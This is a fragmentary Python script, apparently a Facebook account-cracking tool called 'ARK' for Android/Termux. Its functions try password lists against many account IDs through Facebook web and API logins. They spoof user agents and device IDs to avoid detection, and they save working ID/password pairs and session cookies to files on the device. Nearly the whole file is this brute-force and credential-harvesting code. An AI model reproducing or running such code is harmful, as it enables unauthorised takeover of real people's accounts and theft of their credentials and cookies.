#ARK
#Facebook: ARK
#Github : https://github.com/arceus/ark
from os import path
...
tokenku=[]
# LOGIN_KEY
correct_username = 'ark'
key = 'true'

while key == 'true':
    username = input('\33[0;97m[ark]\33[1;96m~~~~>\33[1;92mENTER KEY\33[1;91m: ')

    if username == correct_username:
        print('\33[1;37m\33[0;97m[•]\33[1;32m WELCOME TO ARK TOOL ')
        time.sleep(1)
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [ARK] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m [ARK-ALIVE] %s | %s'%(ids,pas))
                                open(f'/sdcard/ARK-ALIVE.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [ARK-DEAD] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/ARK-DEAD.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def ffb1(ids,names,passlist):
    ...
    'viewport-width': '980',
                        ...
                        if "c_user" in Shahin:
                                ...
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [ARK-ALIVE] %s | %s'%(ids,pas))
                                print(f'\r\r\033[1;32m [FB-LINK] https://facebook.com/%s'%(ids))
                                print(f'\r\r\033[1;32m [COOKIES] %s'%(kuki))
                                #cek_apk(session,coki)
                                open(f'/sdcard/ARK-ALIVE.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [ARK-ALIVE] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/ARK-ALIVE.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
                                        ...
                                        if 'y' in pcp:
                                                print(f'\r\r\x1b[38;5;126m [ARK-PATAY] '+ids+' | '+pas+'\033[1;97m')
                                                open(f'/sdcard/ARK-PATAY.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
...
def gml():
                ...
                linex()
                print(' The process has completed')
                print(' Total ALIVE/DEAD: '+str(len(oks))+'/'+str(len(cps)))
...
def rcrack_free(idf,pwv):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; Tecno spark 6 air Build/QQ1D.267605.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/82.0.1333.369 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.54.15;]',
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\n')
				print('\033[1;92m[ARK-BUHAY] '+idf+' | '+ps+'\033[0;97m')
				cek_apk(coki)
				...
				cid = coki[141:156]
				print('\n')
				print('\033[1;91m[ARK-PATAY] '+idf+' | '+ps+'\033[0;97m')
...
def apix(ids,passlist):
                try:
                        ...
                        for pas in passlist:
                                ...
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua_string = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/100.0.0.0 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/100.0.0.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_20_0) AppleWebKit/100.0.0.0 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/100.0.0.0','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/100.0.0.0 (KHTML, like Gecko) Firefox/100.0.0.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/100.0.0.0 (KHTML, like Gecko) Firefox/100.0.0.0','Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/100.0.0.0 (KHTML, like Gecko) Version/18.0.0.0 Mobile/100.0.0.0 Safari/100.0.0.0','Mozilla/5.0 (Linux; Android 14; Pixel 5) AppleWebKit/100.0.0.0 (KHTML, like Gecko) Chrome/100.0.0.0 Mobile Safari/100.0.0.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/100.0.0.0 (KHTML, like Gecko) Edge/100.0.0.0 Safari/100.0.0.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_20_0) AppleWebKit/100.0.0.0 (KHTML, like Gecko) Safari/100.0.0.0','Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:100.0.0.0) Gecko/20100101 Firefox/100.0.0.0','Mozilla/5.0 (Android 14; Mobile; rv:100.0.0.0) Gecko/100.0.0.0 Firefox/100.0.0.0']
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [ARK-BUHAY] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/ARK-BUHAY.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error']['message']:
